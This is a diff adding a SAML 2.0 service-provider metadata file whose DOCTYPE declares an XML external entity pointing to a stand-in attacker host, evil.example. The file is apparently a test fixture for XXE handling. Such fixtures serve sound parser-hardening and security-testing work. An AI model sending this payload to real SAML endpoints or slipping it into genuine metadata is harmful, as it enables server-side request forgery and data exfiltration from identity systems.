@@ -1,0 +1,9 @@
+<!DOCTYPE md:EntityDescriptor [
+  <!ENTITY xxe SYSTEM "http://evil.example/metadata.dtd">
+]>
+<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
+  <md:SPSSODescriptor AuthnRequestsSigned="true" WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+    <md:NameIDFormat>urn:oasis:names:tc:SAML:1.0:nameid-format:unspecified</md:NameIDFormat>
+    <md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/SAML/POST" Index="0" />
+  </md:SPSSODescriptor>
+</md:EntityDescriptor>
